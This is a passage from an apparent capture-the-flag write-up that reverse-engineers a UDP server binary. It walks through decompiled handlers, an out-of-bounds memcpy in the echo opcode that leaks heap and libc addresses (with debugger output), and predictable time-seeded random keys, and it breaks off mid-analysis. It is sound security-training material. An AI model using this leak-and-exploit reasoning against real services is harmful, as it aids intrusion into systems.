</span></span><span style="display:flex;"><span>          qword_6108[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>          printf(<span style="color:#e6db74">&#34;session %d cleaned</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)i);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    pthread_mutex_unlock(<span style="color:#f92672">&amp;</span>mutex);
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">1u</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It creates 4 pipes, use <code>pthread</code> to create a maximum of 4 threads for connection, reading, and writing.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>select(fd <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#f92672">&amp;</span>readfds, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0LL</span>, <span style="color:#f92672">&amp;</span>timeout) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> 
</span></span></code></pre></div><p>It creates a UDP connection and uses the select function to handle multiple file descriptors. The program waits until one or more of the file descriptors become &ldquo;ready&rdquo;.</p>
<p>To send and receive data to users, <code>sendto()</code> and <code>recvfrom()</code> functions are used.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>v11 <span style="color:#f92672">=</span> recvfrom(fd, buf, <span style="color:#ae81ff">0x1000uLL</span>, <span style="color:#ae81ff">0</span>, addr, (socklen_t <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>addr[<span style="color:#ae81ff">1</span>].sa_family);
</span></span></code></pre></div><p>The program requires the user to send data in a specific structure, which is outlined below.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">data</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> int32 magic;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> int32 op_code;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> int16 size;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> mess[<span style="color:#ae81ff">4086</span>];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Next, it checks the message received from the user, if it checks with each <code>thread_id</code>, the file of op_code is ignored and uses the first 8 bytes to compare with each <code>thread_id</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">session_data</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> int64 id;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> int16 size;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> mess[<span style="color:#ae81ff">4086</span>];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If it matches, it writes the message to the pipe write of the appropriate thread and continues the loop.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ( j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ; <span style="color:#f92672">++</span>j )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( j <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">3</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_22;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buf<span style="color:#f92672">-&gt;</span>magic <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>thread_id <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> j) )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    write(p0[<span style="color:#ae81ff">2</span> <span style="color:#f92672">*</span> j <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>], buf, <span style="color:#ae81ff">0x1000uLL</span>);
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>LABEL_22:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v4 <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)check_data(addr, v8, (<span style="color:#66d9ef">__int64</span>)buf) )
</span></span><span style="display:flex;"><span>      use_opcode((<span style="color:#66d9ef">__int64</span>)addr, (<span style="color:#66d9ef">__int64</span>)v8);
</span></span></code></pre></div><p>Otherwise, it will go to the <code>check_data()</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">check_data</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>a1, data <span style="color:#f92672">*</span>a2, data <span style="color:#f92672">*</span>a3)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  a2<span style="color:#f92672">-&gt;</span>magic <span style="color:#f92672">=</span> a3<span style="color:#f92672">-&gt;</span>magic;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( a2<span style="color:#f92672">-&gt;</span>magic <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x70303070</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    a2<span style="color:#f92672">-&gt;</span>opcode <span style="color:#f92672">=</span> a3<span style="color:#f92672">-&gt;</span>opcode;
</span></span><span style="display:flex;"><span>    a2<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">=</span> a3<span style="color:#f92672">-&gt;</span>size;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( a2<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0xFFFu</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memcpy</span>(a2<span style="color:#f92672">-&gt;</span>mess, a3<span style="color:#f92672">-&gt;</span>mess, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)a2<span style="color:#f92672">-&gt;</span>size);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">strcpy</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;packet too large</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>      v5 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">send_to</span>(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v5);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;server magic mismatch</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">send_to</span>(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v3);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The program checks whether the magic field of the message is equal to <code>0x70303070</code> and if the size field is smaller than 4095. If both these conditions are true, the message is copied to <code>use_opcode()</code> function (which I will talk about later). If either of the conditions is false, the program returns 1 and goes back to the loop.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">use_opcode</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>a1, data <span style="color:#f92672">*</span>a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> opcode; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  opcode <span style="color:#f92672">=</span> a2<span style="color:#f92672">-&gt;</span>opcode;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( opcode <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x301</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    print_data(a1, a2);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( opcode <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x301</span> )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> LABEL_9;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( opcode <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x101</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      generate_str(a1);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( opcode <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x201</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      authenticate(a1, a2);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>LABEL_9:
</span></span><span style="display:flex;"><span>      memset(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>      strcpy(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;unknown opcode</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>      v3 <span style="color:#f92672">=</span> strlen(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>]);
</span></span><span style="display:flex;"><span>      send_to(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], v3);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>There are 3 op_code <code>[0x301, 0x101, 0x201]</code>. I will talk about those opcodes in turn.</p>
<p><code>0x301 opcode</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">print_data</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>a1, data <span style="color:#f92672">*</span>a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> s[<span style="color:#ae81ff">2</span>]; <span style="color:#75715e">// [rsp+10h] [rbp-1020h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int16</span> size; <span style="color:#75715e">// [rsp+18h] [rbp-1018h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _BYTE v5[<span style="color:#ae81ff">6</span>]; <span style="color:#75715e">// [rsp+1Ah] [rbp-1016h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v6; <span style="color:#75715e">// [rsp+1028h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  memset(s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x100CuLL</span>);
</span></span><span style="display:flex;"><span>  s[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> a2<span style="color:#f92672">-&gt;</span>magic;
</span></span><span style="display:flex;"><span>  s[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> a2<span style="color:#f92672">-&gt;</span>opcode;
</span></span><span style="display:flex;"><span>  memcpy(v5, a2<span style="color:#f92672">-&gt;</span>mess, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)a2<span style="color:#f92672">-&gt;</span>size);
</span></span><span style="display:flex;"><span>  size <span style="color:#f92672">=</span> a2<span style="color:#f92672">-&gt;</span>size;
</span></span><span style="display:flex;"><span>  memset(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x200uLL</span>);
</span></span><span style="display:flex;"><span>  memcpy(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], s, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)a2<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>  send_to(a1, (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">1</span>].sa_data[<span style="color:#ae81ff">2</span>], (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int16</span>)a2<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v6 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It simply sends the data that the user has been sending to the user. Does it safely?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>addr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>)malloc(<span style="color:#ae81ff">532uLL</span>);
</span></span><span style="display:flex;"><span>v8 <span style="color:#f92672">=</span> (data <span style="color:#f92672">*</span>)malloc(<span style="color:#ae81ff">0x100CuLL</span>);
</span></span></code></pre></div><p>After examining the variable <code>sockaddr *a1</code>, which has a data field of 0x200 bytes, and the array <code>data *a2</code>, which has 0x1000C bytes of data, we noticed&hellip;</p>
<pre tabindex="0"><code>memcpy(&amp;a1[1].sa_data[2], s, (unsigned __int16)a2-&gt;size + 10);
</code></pre><p>When it uses memcpy to copy <code>s</code> to <code>&amp;a1[1].sa_data[2]</code> with a size larger than 0x200 because <code>a2</code> is below <code>a1</code> struct in the heap mapping address, it causes a message of <code>v5</code> overflow in the metadata field (magic, opcode, size) of <code>a2</code>, so I have the OOB bug.</p>
<pre tabindex="0"><code>pwndbg&gt; tel 100
00:0000 rsp 0x7ffc4d8e0b30  0x5584a5b415e0  0x4141414141414141 (&#39;AAAAAAAA&#39;) // a2
01:0008     0x7ffc4d8e0b38  0x5584a5b413c0  0x100007faf910002               // a1
02:0010     0x7ffc4d8e0b40  0x30170303070
03:0018     0x7ffc4d8e0b48  0x4141414141410fff
04:0020     0x7ffc4d8e0b50  0x4141414141414141 (&#39;AAAAAAAA&#39;)
...         95 skipped
pwndbg&gt;
</code></pre><p>After repeatedly using the send_to loop to leak the size of 0x1000, it printed multiple data from the heap, including libc and heap addresses.</p>
<pre tabindex="0"><code> 0x56244a4b4a17    call   sendto@plt                &lt;sendto@plt&gt;
        fd: 0xb (socket:[133812])
        buf: 0x56244bdc63d4  0x30170303070
        n: 0x1000
        flags: 0x0
        addr: 0x56244bdc63c0  0x100007f1ad40002
        addr_len: 0x10
 
   0x56244a4b4a1c    cmp    rax, -1
   0x56244a4b4a20    jne    0x56244a4b4a31                &lt;0x56244a4b4a31&gt;
 
   0x56244a4b4a22    lea    rax, [rip + 0x15fb]
   0x56244a4b4a29    mov    rdi, rax
   0x56244a4b4a2c    call   error                &lt;error&gt;
[ STACK ]
00:0000 rsp 0x7ffd3980e4b0  0x4
01:0008     0x7ffd3980e4b8  0x414b00000001
02:0010     0x7ffd3980e4c0  0x56244bdc63d4  0x30170303070
03:0018     0x7ffd3980e4c8  0x56244bdc63c0  0x100007f1ad40002
04:0020     0x7ffd3980e4d0  0x2158f0
05:0028     0x7ffd3980e4d8  0x100000000000
06:0030 rbp 0x7ffd3980e4e0  0x7ffd3980f520  0x7ffd3980f540  0x7ffd3980f640  0x1
07:0038     0x7ffd3980e4e8  0x56244a4b5101  nop 
[ BACKTRACE ]
  0   0x56244a4b4a17
   1   0x56244a4b5101
   2   0x56244a4b56ff
   3   0x56244a4b5b78
   4   0x7fc435a29d90 __libc_start_call_main+128
   5   0x7fc435a29e40 __libc_start_main_impl+128
   6   0x56244a4b45e5
[ THREADS (3 TOTAL) ]
   1   &#34;serendipity_pat&#34; stopped: 0x56244a4b4a17
    2   &#34;serendipity_pat&#34; stopped: 0x7fc435ae57f8 &lt;clock_nanosleep@GLIBC_2.2.5+200&gt; 
    3   &#34;serendipity_pat&#34; stopped: 0x7fc435b14a0c &lt;read+76&gt; 

pwndbg&gt;
</code></pre><p>But, on the server, due to the I/O handle or somehow, I couldn&rsquo;t manage to trigger that bug to leak any address. So we should find another way to leak</p>
<p><code>opcode 0x101</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">generate_str</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v1; <span style="color:#75715e">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int64</span> v2; <span style="color:#75715e">// rdx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// [rsp+14h] [rbp-ACh]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>rand; <span style="color:#75715e">// [rsp+18h] [rbp-A8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v7; <span style="color:#75715e">// [rsp+20h] [rbp-A0h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v8; <span style="color:#75715e">// [rsp+28h] [rbp-98h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">136</span>]; <span style="color:#75715e">// [rsp+30h] [rbp-90h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v10; <span style="color:#75715e">// [rsp+B8h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v10 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  rand <span style="color:#f92672">=</span> generate_rand(<span style="color:#ae81ff">32</span>);
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)rand <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)s1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)rand;
</span></span><span style="display:flex;"><span>  qword_6148 <span style="color:#f92672">=</span> v1;
</span></span><span style="display:flex;"><span>  v2 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)rand <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>  qword_6150 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)rand <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>  qword_6158 <span style="color:#f92672">=</span> v2;
</span></span><span style="display:flex;"><span>  v7 <span style="color:#f92672">=</span> calloc(<span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x10uLL</span>);
</span></span><span style="display:flex;"><span>  v8 <span style="color:#f92672">=</span> calloc(<span style="color:#ae81ff">1uLL</span>, <span style="color:#ae81ff">0x10uLL</span>);
</span></span><span style="display:flex;"><span>  memset(s, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x80uLL</span>);
</span></span><span style="display:flex;"><span>  key_iv((<span style="color:#66d9ef">__int64</span>)v7, (<span style="color:#66d9ef">__int64</span>)v8);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> strlen(rand);
</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> encrypt((<span style="color:#66d9ef">__int64</span>)s1, v3, (<span style="color:#66d9ef">__int64</span>)v7, (<span style="color:#66d9ef">__int64</span>)v8, (<span style="color:#66d9ef">__int64</span>)s);
</span></span><span style="display:flex;"><span>  send_to(a1, (<span style="color:#66d9ef">__int64</span>)s, v5);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v10 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This code generates an array of 32 random bytes using <code>srand(time(0))</code>, making it predictable</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>_BYTE <span style="color:#f92672">*</span><span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">sub_293B</span>(<span style="color:#66d9ef">int</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// eax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+14h] [rbp-Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _BYTE <span style="color:#f92672">*</span>v4; <span style="color:#75715e">// [rsp+18h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> time(<span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  srand(v1);
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> calloc(<span style="color:#ae81ff">1uLL</span>, a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> a1; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>      v4[i] <span style="color:#f92672">=</span> rand();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( <span style="color:#f92672">!</span>v4[i] );
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v4;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Continue, it copies the KEY and IV from the file <code>user_config</code> to encrypt with previous random data.</p>
<p><code>opcode 0x201</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">authenticate</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span> <span style="color:#f92672">*</span>a1, data <span style="color:#f92672">*</span>a2)
